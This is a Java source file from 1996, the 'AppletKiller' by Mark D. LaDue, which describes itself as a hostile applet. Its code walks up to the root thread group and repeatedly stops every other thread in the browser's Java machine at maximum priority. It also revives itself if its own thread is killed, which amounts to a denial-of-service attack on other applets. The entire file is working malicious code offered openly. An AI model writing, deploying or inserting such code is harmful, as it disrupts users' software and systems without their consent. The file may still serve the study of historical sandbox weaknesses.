
/*  AppletKiller.java by Mark D. LaDue */

/*  April 1, 1996  */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This hostile applet stops any applets that are running and kills any
    other applets that are downloaded. */ 

import java.applet.*;
import java.awt.*;
import java.io.*;

public class AppletKiller extends java.applet.Applet implements Runnable {
    Thread killer;
    
    public void init() {
        killer = null;
    }

    public void start() {
        if (killer == null) {
            killer = new Thread(this,"killer");
            killer.setPriority(Thread.MAX_PRIORITY);
            killer.start();
        }
    }

    public void stop() {}    

// Kill all threads except this one

    public void run() {
        try {
            while (true) {
                ThreadKiller.killAllThreads();
                try { killer.sleep(100); }
                catch (InterruptedException e) {}
            }
        }
        catch (ThreadDeath td) {}

// Resurrect the hostile thread in case of accidental ThreadDeath

        finally {
            AppletKiller ack = new AppletKiller();
            Thread reborn = new Thread(ack, "killer");
            reborn.start();
        }
    }
}

class ThreadKiller {

// Ascend to the root ThreadGroup and list all subgroups recursively,
// killing all threads as we go

    public static void killAllThreads() {
        ThreadGroup thisGroup;
        ThreadGroup topGroup;
        ThreadGroup parentGroup;
        
// Determine the current thread group
        thisGroup = Thread.currentThread().getThreadGroup();
        
// Proceed to the top ThreadGroup
        topGroup  = thisGroup;
        parentGroup = topGroup.getParent();
        while(parentGroup != null) {
            topGroup  = parentGroup;
            parentGroup = parentGroup.getParent();
        }
// Find all subgroups recursively 
        findGroups(topGroup);
    }
    
    private static void findGroups(ThreadGroup g) {
        if (g == null) {return;}
        else {
        int numThreads = g.activeCount();
        int numGroups = g.activeGroupCount();
        Thread[] threads = new Thread[numThreads];
        ThreadGroup[] groups = new ThreadGroup[numGroups];
        g.enumerate(threads, false);
        g.enumerate(groups, false);
        for (int i = 0; i < numThreads; i++)
            killOneThread(threads[i]);
        for (int i = 0; i < numGroups; i++)
            findGroups(groups[i]);
        }
    }

    private static void killOneThread(Thread t) { 
        if (t == null || t.getName().equals("killer")) {return;}
        else {t.stop();}
    }
}
